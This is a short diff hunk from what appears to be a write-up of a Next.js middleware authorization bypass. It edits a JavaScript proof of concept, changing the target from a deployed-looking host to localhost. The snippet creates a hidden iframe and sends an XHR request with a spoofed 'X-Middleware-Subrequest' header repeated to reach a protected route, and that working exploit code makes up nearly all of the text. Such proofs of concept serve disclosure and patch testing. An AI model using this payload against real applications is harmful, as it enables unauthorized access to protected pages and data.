@@ -24,11 +24,11 @@ The following JavaScript snippet demonstrates how an attacker can bypass the Mid
 (function () {
   var iframe = document.createElement("iframe");
   iframe.style.display = "none";
-  iframe.src = "https://zerotix.liara.run/protected-route";
+  iframe.src = "http://localhost:3000/protected-route";
   document.body.appendChild(iframe);
   iframe.onload = function () {
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://zerotix.liara.run/protected-route", true);
+    xhr.open("GET", "http://localhost:3000/protected-route", true);
     xhr.setRequestHeader("X-Middleware-Subrequest", "middleware:middleware:middleware:middleware:middleware");
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4) {
